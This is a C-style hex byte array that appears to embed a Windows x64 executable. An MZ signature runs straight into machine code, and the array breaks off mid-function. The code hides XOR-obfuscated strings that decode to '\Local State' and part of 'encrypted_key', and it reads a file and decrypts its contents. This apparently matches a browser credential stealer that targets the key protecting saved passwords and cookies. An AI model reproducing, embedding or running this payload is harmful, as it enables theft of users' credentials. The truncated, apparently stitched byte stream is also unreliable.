{0x4d, 0x5a, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0xff, 0xff, 0x00, 0x00,
0x00, 0x00, 0x8b, 0x4d, 0x5f, 0x48, 0x8d, 0x45, 0x5f, 0x48, 0x8b, 0x3d, 0xf0, 0xfb, 0x00, 0x00,
0x4c, 0x8d, 0x4d, 0xaf, 0x44, 0x8b, 0x45, 0x6f, 0x48, 0x8b, 0x55, 0x67, 0x44, 0x89, 0x6c, 0x24,
0x48, 0x48, 0x89, 0x44, 0x24, 0x40, 0x89, 0x4c, 0x24, 0x38, 0x48, 0x8b, 0x4d, 0x9f, 0x4c, 0x89,
0x7c, 0x24, 0x30, 0x44, 0x89, 0x6c, 0x24, 0x28, 0x4c, 0x89, 0x6c, 0x24, 0x20, 0xff, 0xd7, 0x85,
0xc0, 0x75, 0x2c, 0x8b, 0x5d, 0x5f, 0x85, 0xdb, 0x74, 0x25, 0x41, 0x8b, 0x56, 0x08, 0x49, 0x8b,
0xce, 0x03, 0xd3, 0xe8, 0x38, 0xe5, 0xff, 0xff, 0x4d, 0x39, 0x2e, 0x74, 0x12, 0x41, 0x8b, 0x7e,
0x08, 0x8b, 0xcb, 0x49, 0x03, 0x3e, 0x49, 0x8b, 0xf7, 0xf3, 0xa4, 0x41, 0x01, 0x5e, 0x08, 0x48,
0x8b, 0x05, 0x0a, 0xfa, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x0d, 0x33, 0xd2, 0x41, 0xb8, 0x00,
0x80, 0x00, 0x00, 0x49, 0x8b, 0xcf, 0xff, 0xd0, 0x48, 0x8b, 0x05, 0x79, 0xfb, 0x00, 0x00, 0x48,
0x85, 0xc0, 0x74, 0x06, 0x48, 0x8b, 0x4d, 0x9f, 0xff, 0xd0, 0x48, 0x8b, 0x05, 0x6f, 0xfb, 0x00,
0x00, 0x48, 0x85, 0xc0, 0x74, 0x08, 0x48, 0x8b, 0x4d, 0x8f, 0x33, 0xd2, 0xff, 0xd0, 0x4c, 0x8d,
0x9c, 0x24, 0xf0, 0x00, 0x00, 0x00, 0x49, 0x8b, 0x5b, 0x30, 0x49, 0x8b, 0x73, 0x38, 0x49, 0x8b,
0x7b, 0x40, 0x49, 0x8b, 0xe3, 0x41, 0x5f, 0x41, 0x5e, 0x41, 0x5d, 0x41, 0x5c, 0x5d, 0xc3, 0xcc,
0x4c, 0x8b, 0xdc, 0x49, 0x89, 0x5b, 0x08, 0x57, 0x48, 0x83, 0xec, 0x40, 0x48, 0x8b, 0x05, 0x7d,
0xfa, 0x00, 0x00, 0x48, 0x8b, 0xd9, 0x49, 0xc7, 0x43, 0xe8, 0x00, 0x00, 0x00, 0x00, 0x49, 0x8d,
0x4b, 0x18, 0x48, 0x8b, 0xfa, 0x49, 0xc7, 0x43, 0xe0, 0x00, 0x00, 0x00, 0x00, 0x45, 0x33, 0xc9,
0x49, 0x89, 0x4b, 0xd8, 0x33, 0xd2, 0xc7, 0x44, 0x24, 0x60, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8b,
0xcf, 0x45, 0x8d, 0x41, 0x01, 0xff, 0xd0, 0x85, 0xc0, 0x74, 0x4f, 0x8b, 0x54, 0x24, 0x60, 0x48,
0x8b, 0xcb, 0xe8, 0x69, 0xe4, 0xff, 0xff, 0x4c, 0x8b, 0x0b, 0x4d, 0x85, 0xc9, 0x74, 0x3b, 0x48,
0x8b, 0x05, 0x2a, 0xfa, 0x00, 0x00, 0x48, 0x8d, 0x4c, 0x24, 0x60, 0x33, 0xd2, 0x48, 0xc7, 0x44,
0x24, 0x30, 0x00, 0x00, 0x00, 0x00, 0x48, 0xc7, 0x44, 0x24, 0x28, 0x00, 0x00, 0x00, 0x00, 0x48,
0x89, 0x4c, 0x24, 0x20, 0x48, 0x8b, 0xcf, 0x44, 0x8d, 0x42, 0x01, 0xff, 0xd0, 0x85, 0xc0, 0x74,
0x09, 0x8b, 0x44, 0x24, 0x60, 0x89, 0x43, 0x08, 0xeb, 0x02, 0x33, 0xc0, 0x48, 0x8b, 0x5c, 0x24,
0x50, 0x48, 0x83, 0xc4, 0x40, 0x5f, 0xc3, 0xcc, 0x48, 0x8b, 0xc4, 0x48, 0x89, 0x58, 0x08, 0x48,
0x89, 0x68, 0x10, 0x48, 0x89, 0x70, 0x18, 0x48, 0x89, 0x78, 0x20, 0x44, 0x8b, 0xda, 0x48, 0x8b,
0xe9, 0x45, 0x85, 0xc9, 0x74, 0x49, 0x44, 0x3b, 0xca, 0x77, 0x44, 0x45, 0x33, 0xd2, 0x41, 0x8b,
0xf9, 0x41, 0x8b, 0xca, 0x49, 0x8b, 0xd8, 0x48, 0x03, 0xcd, 0x48, 0x8b, 0xd7, 0x48, 0x2b, 0xd9,
0x8a, 0x01, 0x48, 0xff, 0xca, 0x3a, 0x04, 0x0b, 0x75, 0x19, 0x48, 0xff, 0xc1, 0x48, 0x85, 0xd2,
0x75, 0xee, 0x48, 0x8b, 0x4c, 0x24, 0x28, 0x48, 0x85, 0xc9, 0x74, 0x03, 0x44, 0x89, 0x11, 0xb0,
0x01, 0xeb, 0x0e, 0x41, 0xff, 0xc2, 0x43, 0x8d, 0x04, 0x0a, 0x41, 0x3b, 0xc3, 0x76, 0xc2, 0x32,
0xc0, 0x48, 0x8b, 0x5c, 0x24, 0x08, 0x48, 0x8b, 0x6c, 0x24, 0x10, 0x48, 0x8b, 0x74, 0x24, 0x18,
0x48, 0x8b, 0x7c, 0x24, 0x20, 0xc3, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x08, 0x48, 0x89, 0x74,
0x24, 0x10, 0x57, 0x48, 0x83, 0xec, 0x50, 0x48, 0x8b, 0xd9, 0x48, 0x8b, 0xfa, 0x48, 0x8b, 0xca,
0xe8, 0x63, 0xe6, 0xff, 0xff, 0x84, 0xc0, 0x0f, 0x84, 0x09, 0x01, 0x00, 0x00, 0x48, 0x8b, 0xcf,
0xe8, 0xeb, 0xe4, 0xff, 0xff, 0x48, 0x8b, 0xf0, 0x48, 0x85, 0xc0, 0x0f, 0x84, 0xf5, 0x00, 0x00,
0x00, 0x4c, 0x8b, 0x15, 0xe0, 0xf9, 0x00, 0x00, 0x45, 0x33, 0xc9, 0x48, 0xc7, 0x44, 0x24, 0x30,
0x00, 0x00, 0x00, 0x00, 0xba, 0x00, 0x00, 0x00, 0x80, 0xc7, 0x44, 0x24, 0x28, 0x80, 0x00, 0x00,
0x00, 0x48, 0x8b, 0xc8, 0xc7, 0x44, 0x24, 0x20, 0x03, 0x00, 0x00, 0x00, 0x45, 0x8d, 0x41, 0x07,
0x41, 0xff, 0xd2, 0x48, 0x8b, 0xf8, 0x48, 0x8b, 0x05, 0x13, 0xf8, 0x00, 0x00, 0x48, 0x85, 0xc0,
0x74, 0x0d, 0x33, 0xd2, 0x41, 0xb8, 0x00, 0x80, 0x00, 0x00, 0x48, 0x8b, 0xce, 0xff, 0xd0, 0x48,
0x83, 0xff, 0xff, 0x0f, 0x84, 0x9d, 0x00, 0x00, 0x00, 0x4c, 0x8b, 0x05, 0xe0, 0xf8, 0x00, 0x00,
0x48, 0x8d, 0x54, 0x24, 0x40, 0x48, 0x8b, 0xcf, 0x41, 0xff, 0xd0, 0x85, 0xc0, 0x74, 0x75, 0x48,
0x8b, 0x54, 0x24, 0x40, 0x48, 0x85, 0xd2, 0x7e, 0x6b, 0xff, 0xc2, 0x48, 0x8b, 0xcb, 0xe8, 0xdd,
0xe2, 0xff, 0xff, 0x48, 0x83, 0x3b, 0x00, 0x74, 0x5b, 0x48, 0xc7, 0x44, 0x24, 0x78, 0x00, 0x00,
0x00, 0x00, 0x45, 0x33, 0xc9, 0x48, 0x8b, 0x54, 0x24, 0x78, 0x45, 0x33, 0xc0, 0x48, 0x8b, 0xcf,
0xc7, 0x44, 0x24, 0x70, 0x00, 0x00, 0x00, 0x00, 0xff, 0x15, 0x9a, 0xf8, 0x00, 0x00, 0x48, 0x8b,
0x05, 0x9b, 0xf8, 0x00, 0x00, 0x4c, 0x8d, 0x4c, 0x24, 0x70, 0x44, 0x8b, 0x44, 0x24, 0x40, 0x48,
0x8b, 0xcf, 0x48, 0x8b, 0x13, 0x48, 0xc7, 0x44, 0x24, 0x20, 0x00, 0x00, 0x00, 0x00, 0xff, 0xd0,
0x85, 0xc0, 0x74, 0x10, 0x8b, 0x44, 0x24, 0x70, 0x89, 0x43, 0x0c, 0x8b, 0xc8, 0x48, 0x8b, 0x03,
0xc6, 0x04, 0x01, 0x00, 0x48, 0x8b, 0xcf, 0xff, 0x15, 0x83, 0xf7, 0x00, 0x00, 0x83, 0x7b, 0x0c,
0x00, 0x0f, 0x97, 0xc0, 0xeb, 0x02, 0x32, 0xc0, 0x48, 0x8b, 0x5c, 0x24, 0x60, 0x48, 0x8b, 0x74,
0x24, 0x68, 0x48, 0x83, 0xc4, 0x50, 0x5f, 0xc3, 0x41, 0x83, 0xf8, 0x0c, 0x0f, 0x82, 0x0c, 0x02,
0x00, 0x00, 0x48, 0x8b, 0xc4, 0x48, 0x89, 0x58, 0x08, 0x48, 0x89, 0x70, 0x10, 0x48, 0x89, 0x78,
0x18, 0x55, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x48, 0x8d, 0x68, 0xa9, 0x48, 0x81,
0xec, 0x90, 0x00, 0x00, 0x00, 0x8b, 0x02, 0x49, 0x8b, 0xd9, 0x83, 0xc0, 0x04, 0x4c, 0x8b, 0xda,
0x4c, 0x8b, 0xe9, 0x44, 0x8d, 0x50, 0x04, 0x45, 0x3b, 0xd0, 0x0f, 0x87, 0xae, 0x01, 0x00, 0x00,
0x8b, 0x0c, 0x10, 0x42, 0x8d, 0x04, 0x11, 0x41, 0x3b, 0xc0, 0x0f, 0x87, 0x9e, 0x01, 0x00, 0x00,
0x83, 0xf9, 0x20, 0x75, 0x16, 0x41, 0x8b, 0xd2, 0x44, 0x8b, 0xc1, 0x49, 0x03, 0xd3, 0x49, 0x8b,
0xcd, 0xe8, 0x82, 0xe2, 0xff, 0xff, 0xe9, 0x83, 0x01, 0x00, 0x00, 0x45, 0x3b, 0xd0, 0x0f, 0x83,
0x7a, 0x01, 0x00, 0x00, 0x41, 0x80, 0x3c, 0x12, 0x03, 0x41, 0x8d, 0x4a, 0x01, 0x0f, 0x85, 0x6b,
0x01, 0x00, 0x00, 0x8d, 0x41, 0x5c, 0x41, 0x3b, 0xc0, 0x0f, 0x87, 0x5f, 0x01, 0x00, 0x00, 0x44,
0x8b, 0x75, 0x7f, 0x8d, 0x41, 0x20, 0x8b, 0xf1, 0x33, 0xff, 0x8b, 0xc8, 0x49, 0x03, 0xf3, 0x49,
0x03, 0xcb, 0x48, 0xc7, 0x45, 0x1f, 0x00, 0x00, 0x00, 0x00, 0x83, 0xc0, 0x0c, 0x48, 0x89, 0x4d,
0xff, 0x8b, 0xc8, 0x83, 0xc0, 0x20, 0x49, 0x03, 0xc3, 0x48, 0xc7, 0x45, 0x17, 0x00, 0x00, 0x00,
0x00, 0x49, 0x03, 0xcb, 0x48, 0x89, 0x45, 0xef, 0x48, 0x89, 0x4d, 0xf7, 0x45, 0x85, 0xf6, 0x0f,
0x84, 0x19, 0x01, 0x00, 0x00, 0x4c, 0x8b, 0x0b, 0x48, 0x8d, 0x4d, 0x17, 0x48, 0x8b, 0xd6, 0xe8,
0xdc, 0xf6, 0xff, 0xff, 0x8b, 0x45, 0x1f, 0x85, 0xc0, 0x75, 0x31, 0xff, 0xc7, 0x48, 0x83, 0xc3,
0x08, 0x41, 0x3b, 0xfe, 0x72, 0xdf, 0x85, 0xc0, 0x75, 0x22, 0x48, 0x8b, 0x4d, 0x17, 0x48, 0x85,
0xc9, 0x0f, 0x84, 0xe7, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x05, 0x32, 0xf6, 0x00, 0x00, 0x48, 0x85,
0xc0, 0x0f, 0x84, 0xd7, 0x00, 0x00, 0x00, 0xe9, 0xc8, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x7d, 0x17,
0x33, 0xdb, 0x45, 0x33, 0xc0, 0x48, 0xc7, 0x45, 0x0f, 0x00, 0x00, 0x00, 0x00, 0x48, 0x89, 0x5d,
0x07, 0x85, 0xc0, 0x74, 0x54, 0x48, 0x8b, 0xf7, 0x45, 0x33, 0xf6, 0x4c, 0x8b, 0xf8, 0x49, 0x8b,
0xc6, 0x4c, 0x8d, 0x25, 0x10, 0xe7, 0x00, 0x00, 0x83, 0xe0, 0x1f, 0x41, 0x8d, 0x50, 0x01, 0x48,
0x8d, 0x4d, 0x07, 0x46, 0x8a, 0x24, 0x20, 0x44, 0x32, 0x26, 0xe8, 0xf1, 0xe0, 0xff, 0xff, 0x48,
0x8b, 0x5d, 0x07, 0x48, 0x85, 0xdb, 0x74, 0x11, 0x44, 0x8b, 0x45, 0x0f, 0x45, 0x88, 0x24, 0x18,
0x41, 0xff, 0xc0, 0x44, 0x89, 0x45, 0x0f, 0xeb, 0x04, 0x44, 0x8b, 0x45, 0x0f, 0x49, 0xff, 0xc6,
0x48, 0xff, 0xc6, 0x49, 0x83, 0xef, 0x01, 0x75, 0xb5, 0x48, 0x8b, 0x45, 0xef, 0x48, 0x8b, 0xd3,
0x4c, 0x8b, 0x4d, 0xff, 0x49, 0x8b, 0xcd, 0x48, 0x89, 0x44, 0x24, 0x38, 0x48, 0x8b, 0x45, 0xf7,
0xc7, 0x44, 0x24, 0x30, 0x20, 0x00, 0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x28, 0xe8, 0x8e, 0xf8,
0xff, 0xff, 0x48, 0x8b, 0x05, 0x87, 0xf5, 0x00, 0x00, 0x48, 0x85, 0xdb, 0x74, 0x19, 0x48, 0x85,
0xc0, 0x74, 0x14, 0x33, 0xd2, 0x41, 0xb8, 0x00, 0x80, 0x00, 0x00, 0x48, 0x8b, 0xcb, 0xff, 0xd0,
0x48, 0x8b, 0x05, 0x69, 0xf5, 0x00, 0x00, 0x48, 0x85, 0xff, 0x74, 0x12, 0x48, 0x85, 0xc0, 0x74,
0x0d, 0x48, 0x8b, 0xcf, 0x41, 0xb8, 0x00, 0x80, 0x00, 0x00, 0x33, 0xd2, 0xff, 0xd0, 0x4c, 0x8d,
0x9c, 0x24, 0x90, 0x00, 0x00, 0x00, 0x49, 0x8b, 0x5b, 0x30, 0x49, 0x8b, 0x73, 0x38, 0x49, 0x8b,
0x7b, 0x40, 0x49, 0x8b, 0xe3, 0x41, 0x5f, 0x41, 0x5e, 0x41, 0x5d, 0x41, 0x5c, 0x5d, 0xc3, 0xcc,
0x48, 0x89, 0x5c, 0x24, 0x18, 0x48, 0x89, 0x4c, 0x24, 0x08, 0x55, 0x56, 0x57, 0x41, 0x54, 0x41,
0x55, 0x41, 0x56, 0x41, 0x57, 0x48, 0x8d, 0xac, 0x24, 0x40, 0xfe, 0xff, 0xff, 0x48, 0x81, 0xec,
0xc0, 0x02, 0x00, 0x00, 0x40, 0x8a, 0x3a, 0x48, 0x8d, 0x44, 0x24, 0x60, 0x33, 0xf6, 0x4d, 0x8b,
0xe0, 0x48, 0x8b, 0xda, 0x40, 0x84, 0xff, 0x74, 0x1c, 0x48, 0x8d, 0x4c, 0x24, 0x60, 0x48, 0x8b,
0xf2, 0x48, 0x2b, 0xf1, 0x40, 0x88, 0x38, 0x48, 0xff, 0xc0, 0x40, 0x8a, 0x3c, 0x06, 0x40, 0x84,
0xff, 0x75, 0xf1, 0x33, 0xf6, 0x40, 0x38, 0x35, 0x2f, 0xf4, 0x00, 0x00, 0x48, 0x8d, 0x15, 0xe5,
0x04, 0x01, 0x00, 0x40, 0x88, 0x30, 0x41, 0xb6, 0x0a, 0x75, 0x41, 0xc7, 0x44, 0x24, 0x30, 0x56,
0x46, 0x65, 0x69, 0x48, 0x8b, 0xce, 0xc7, 0x44, 0x24, 0x34, 0x6b, 0x66, 0x2a, 0x59, 0xc7, 0x44,
0x24, 0x38, 0x7e, 0x6b, 0x7e, 0x6f, 0x40, 0x88, 0x74, 0x24, 0x3c, 0x8a, 0x44, 0x0c, 0x30, 0x41,
0x32, 0xc6, 0x88, 0x04, 0x11, 0x48, 0xff, 0xc1, 0x48, 0x83, 0xf9, 0x0c, 0x72, 0xed, 0x40, 0x88,
0x35, 0xaf, 0x04, 0x01, 0x00, 0xc6, 0x05, 0xdf, 0xf3, 0x00, 0x00, 0x01, 0x48, 0x8d, 0x4c, 0x24,
0x60, 0xe8, 0xb6, 0xe0, 0xff, 0xff, 0x48, 0x8d, 0x4c, 0x24, 0x48, 0xe8, 0x2c, 0xd5, 0xff, 0xff,
0x48, 0x8d, 0x54, 0x24, 0x60, 0x48, 0x8d, 0x4c, 0x24, 0x48, 0xe8, 0xd9, 0xfb, 0xff, 0xff, 0x84,
0xc0, 0x0f, 0x85, 0x62, 0x01, 0x00, 0x00, 0x8a, 0x0b, 0x48, 0x8d, 0x44, 0x24, 0x60, 0x84, 0xc9,
0x74, 0x17, 0x48, 0x8d, 0x7c, 0x24, 0x60, 0x48, 0x8b, 0xd3, 0x48, 0x2b, 0xd7, 0x88, 0x08, 0x48,
0xff, 0xc0, 0x8a, 0x0c, 0x10, 0x84, 0xc9, 0x75, 0xf4, 0x40, 0x38, 0x35, 0x82, 0xf6, 0x00, 0x00,
0x48, 0x8d, 0x15, 0xe1, 0x25, 0x01, 0x00, 0x40, 0x88, 0x30, 0x75, 0x3f, 0x66, 0x0f, 0x6f, 0x05,
0x3c, 0xe8, 0x00, 0x00, 0x48, 0x8b, 0xce, 0xf3, 0x0f, 0x7f, 0x44, 0x24, 0x30, 0xc7, 0x44, 0x24,
0x40, 0x7e, 0x6b, 0x7e, 0x6f, 0x40, 0x88, 0x74, 0x24, 0x44, 0x8a, 0x44, 0x0c, 0x30, 0x41, 0x32,
0xc6, 0x88, 0x04, 0x11, 0x48, 0xff, 0xc1, 0x48, 0x83, 0xf9, 0x14, 0x72, 0xed, 0x40, 0x88, 0x35,
0xb8, 0x25, 0x01, 0x00, 0xc6, 0x05, 0x37, 0xf6, 0x00, 0x00, 0x01, 0x48, 0x8d, 0x4c, 0x24, 0x60,
0xe8, 0x17, 0xe0, 0xff, 0xff, 0x48, 0x8d, 0x54, 0x24, 0x60, 0x48, 0x8d, 0x4c, 0x24, 0x48, 0xe8,
0x44, 0xfb, 0xff, 0xff, 0x84, 0xc0, 0x0f, 0x85, 0xcd, 0x00, 0x00, 0x00, 0xe8, 0x73, 0xf1, 0xff,
0xff, 0x48, 0x8d, 0x54, 0x24, 0x60, 0x8b, 0xf8, 0x48, 0x8d, 0x4c, 0x24, 0x48, 0xe8, 0x26, 0xfb,
0xff, 0xff, 0x84, 0xc0, 0x0f, 0x85, 0x8c, 0x00, 0x00, 0x00, 0x8a, 0x13, 0x48, 0x8d, 0x4c, 0x24,
0x60, 0x84, 0xd2, 0x74, 0x14, 0x48, 0x8d, 0x44, 0x24, 0x60, 0x48, 0x2b, 0xd8, 0x88, 0x11, 0x48,
0xff, 0xc1, 0x8a, 0x14, 0x19, 0x84, 0xd2, 0x75, 0xf4, 0x40, 0x38, 0x35, 0x0d, 0xf3, 0x00, 0x00,
0x48, 0x8d, 0x15, 0x89, 0x25, 0x01, 0x00, 0x40, 0x88, 0x31, 0x75, 0x41, 0xc7, 0x44, 0x24, 0x30,
0x56, 0x46, 0x65, 0x69, 0x48, 0x8b, 0xce, 0xc7, 0x44, 0x24, 0x34, 0x6b, 0x66, 0x2a, 0x59, 0xc7,
0x44, 0x24, 0x38, 0x7e, 0x6b, 0x7e, 0x6f, 0x40, 0x88, 0x74, 0x24, 0x3c, 0x8a, 0x44, 0x0c, 0x30,
0x41, 0x32, 0xc6, 0x88, 0x04, 0x11, 0x48, 0xff, 0xc1, 0x48, 0x83, 0xf9, 0x0c, 0x72, 0xed, 0x40,
0x88, 0x35, 0x56, 0x25, 0x01, 0x00, 0xc6, 0x05, 0xc0, 0xf2, 0x00, 0x00, 0x01, 0x48, 0x8d, 0x4c,
0x24, 0x60, 0xe8, 0x65, 0xdf, 0xff, 0xff, 0x48, 0x8d, 0x54, 0x24, 0x60, 0x48, 0x8d, 0x4c, 0x24,
0x48, 0xe8, 0x92, 0xfa, 0xff, 0xff, 0x85, 0xff, 0x74, 0x06, 0xff, 0x15, 0xd8, 0xf3, 0x00, 0x00,
0x8b, 0x5c, 0x24, 0x54, 0x85, 0xdb, 0x75, 0x15, 0x48, 0x8d, 0x4c, 0x24, 0x48, 0xe8, 0xd6, 0xd4,
0xff, 0xff, 0x32, 0xc0, 0xe9, 0xb7, 0x01, 0x00, 0x00, 0x8b, 0x5c, 0x24, 0x54, 0x48, 0x8d, 0x4c,
0x24, 0x30, 0xe8, 0xa5, 0xd3, 0xff, 0xff, 0x44, 0x8b, 0xf6, 0x41, 0x38, 0x34, 0x24, 0x74, 0x09,
0x41, 0xff, 0xc6, 0x43, 0x38, 0x34, 0x26, 0x75, 0xf7, 0x41, 0x8d, 0x4e, 0x05, 0xe8, 0xa2, 0xb4,
0xff, 0xff, 0x4c, 0x8b, 0xf8, 0x48, 0x85, 0xc0, 0x74, 0x6a, 0x4c, 0x8b, 0x6c, 0x24, 0x48, 0x41,
0x8d, 0x56, 0x01, 0xc6, 0x00, 0x22, 0x48, 0x8d, 0x78, 0x01, 0x41, 0x8b, 0xce, 0x49, 0x8b, 0xf4,
0xf3, 0xa4, 0x8d, 0x7a, 0x01, 0xc6, 0x04, 0x02, 0x22, 0x33, 0xf6, 0x4d, 0x8b, 0xc7, 0x8b, 0xd3,
0x49, 0x8b, 0xcd, 0xc6, 0x04, 0x07, 0x3a, 0xff, 0xc7, 0xc6, 0x04, 0x07, 0x22, 0xff, 0xc7, 0x44,
0x8b, 0xcf, 0x40, 0x88, 0x34, 0x07, 0x48, 0x8d, 0x85, 0x08, 0x02, 0x00, 0x00, 0x48, 0x89, 0x44,
0x24, 0x20, 0xe8, 0x71, 0xf9, 0xff, 0xff, 0x84, 0xc0, 0x48, 0x8b, 0x05, 0x70, 0xf2, 0x00, 0x00,
0x75, 0x32, 0x48, 0x85, 0xc0, 0x74, 0x0d, 0x33, 0xd2, 0x41, 0xb8, 0x00, 0x80, 0x00, 0x00, 0x49,
0x8b, 0xcf, 0xff, 0xd0, 0x8b, 0x5c, 0x24, 0x3c, 0x48, 0x8d, 0x4c, 0x24, 0x48, 0xe8, 0x26, 0xd4,
0xff, 0xff, 0x85, 0xdb, 0x0f, 0x85, 0xe1, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x4c, 0x24, 0x30, 0xe9,
0x39, 0xff, 0xff, 0xff, 0x48, 0x85, 0xc0, 0x74, 0x0d, 0x33, 0xd2, 0x41, 0xb8, 0x00, 0x80, 0x00,
0x00, 0x49, 0x8b, 0xcf, 0xff, 0xd0, 0x44, 0x8b, 0xbd, 0x08, 0x02, 0x00, 0x00, 0x44, 0x03, 0xff,
0x45, 0x8b, 0xf7, 0x44, 0x3b, 0xfb, 0x73, 0x16, 0x41, 0x8b, 0xcf, 0x49, 0x03, 0xcd, 0x80, 0x39,
0x22, 0x74, 0x0b, 0x41, 0xff, 0xc6, 0x48, 0xff, 0xc1, 0x44, 0x3b, 0xf3, 0x72, 0xf0, 0x44, 0x3b,
0xf3, 0x73, 0xa1, 0x8b, 0x5c, 0x24, 0x3c, 0x45, 0x2b, 0xf7, 0x41, 0x8d, 0x0c, 0x1e, 0x8d, 0x41,
0x01, 0x3b, 0x44, 0x24, 0x38, 0x76, 0x60, 0x8d, 0x04, 0x4d, 0x02, 0x00, 0x00, 0x00, 0x8b, 0xc8,
0x89, 0x44, 0x24, 0x38, 0x8b, 0xf0, 0xe8, 0xa9, 0xb3, 0xff, 0xff, 0x4c, 0x8b, 0xe0, 0x48, 0x85,
0xc0, 0x0f, 0x84, 0x71, 0xff, 0xff, 0xff, 0x4c, 0x8b, 0x4c, 0x24, 0x30, 0x48, 0x8b, 0xf8, 0x33,
0xc0, 0x8b, 0xce, 0xf3, 0xaa, 0x4d, 0x85, 0xc9, 0x74, 0x0a, 0x8b, 0xcb, 0x49, 0x8b, 0xfc, 0x49,
0x8b, 0xf1, 0xf3, 0xa4, 0x48, 0x8b, 0x05, 0xa5, 0xf1, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x12,
0x4d, 0x85, 0xc9, 0x74, 0x0d, 0x33, 0xd2, 0x41, 0xb8, 0x00, 0x80, 0x00, 0x00, 0x49, 0x8b, 0xc9,
0xff, 0xd0, 0x4c, 0x89, 0x64, 0x24, 0x30, 0x48, 0x8b, 0x54, 0x24, 0x30, 0x41, 0x8b, 0xf7, 0x49,
0x03, 0xf5, 0x41, 0x8b, 0xce, 0x48, 0x8d, 0x3c, 0x1a, 0x41, 0x03, 0xde, 0xf3, 0xa4, 0xc6, 0x04,
0x13, 0x00, 0x89, 0x5c, 0x24, 0x3c, 0xe9, 0x0d, 0xff, 0xff, 0xff, 0x48, 0x8b, 0xbd, 0x00, 0x02,
0x00, 0x00, 0x48, 0x8b, 0x54, 0x24, 0x30, 0x48, 0x8b, 0xcf, 0xe8, 0xa1, 0xf7, 0xff, 0xff, 0x48,
0x8d, 0x4c, 0x24, 0x30, 0xe8, 0x1f, 0xd3, 0xff, 0xff, 0x83, 0x7f, 0x08, 0x00, 0x0f, 0x97, 0xc0,
0x48, 0x8b, 0x9c, 0x24, 0x10, 0x03, 0x00, 0x00, 0x48, 0x81, 0xc4, 0xc0, 0x02, 0x00, 0x00, 0x41,
0x5f, 0x41, 0x5e, 0x41, 0x5d, 0x41, 0x5c, 0x5f, 0x5e, 0x5d, 0xc3, 0xcc, 0x48, 0x8b, 0xc4, 0x48,
0x89, 0x70, 0x08, 0x48, 0x89, 0x78, 0x10, 0x4c, 0x89, 0x60, 0x18, 0x4c, 0x89, 0x68, 0x20, 0x55,
0x41, 0x56, 0x41, 0x57, 0x48, 0x8d, 0x68, 0xa1, 0x48, 0x81, 0xec, 0xe0, 0x00, 0x00, 0x00, 0x33,
0xf6, 0x4d, 0x8b, 0xe8, 0x40, 0x38, 0x35, 0x77, 0xf0, 0x00, 0x00, 0x4c, 0x8d, 0x05, 0xb6, 0x21,
0x01, 0x00, 0x4c, 0x8b, 0xfa, 0x48, 0x89, 0x75, 0xbf, 0x45, 0x8b, 0xe1, 0x48, 0x89, 0x75, 0xb7,
0x48, 0x8b, 0xd1, 0x75, 0x3e, 0x66, 0x0f, 0x6f, 0x05, 0x53, 0xe9, 0x00, 0x00, 0x8b, 0xce, 0xf3,
0x0f, 0x7f, 0x45, 0x9f, 0xc7, 0x45, 0xaf, 0x7e, 0x6f, 0x6e, 0x55, 0xc7, 0x45, 0xb3, 0x61, 0x6f,
0x73, 0x00, 0x8a, 0x44, 0x0d, 0x9f, 0x34, 0x0a, 0x42, 0x88, 0x04, 0x01, 0x48, 0xff, 0xc1, 0x48,
0x83, 0xf9, 0x17, 0x72, 0xed, 0x40, 0x88, 0x35, 0x83, 0x21, 0x01, 0x00, 0xc6, 0x05, 0x1f, 0xf0,
0x00, 0x00, 0x01, 0x48, 0x8d, 0x4d, 0xb7, 0xe8, 0x64, 0xfb, 0xff, 0xff, 0x84, 0xc0, 0x75, 0x22,
0x48, 0x8b, 0x4d, 0xb7, 0x48, 0x85, 0xc9, 0x0f, 0x84, 0x0f, 0x02, 0x00, 0x00, 0x48, 0x8b, 0x05,
0x7c, 0xf0, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x0f, 0x84, 0xff, 0x01, 0x00, 0x00, 0xe9, 0xf0, 0x01,
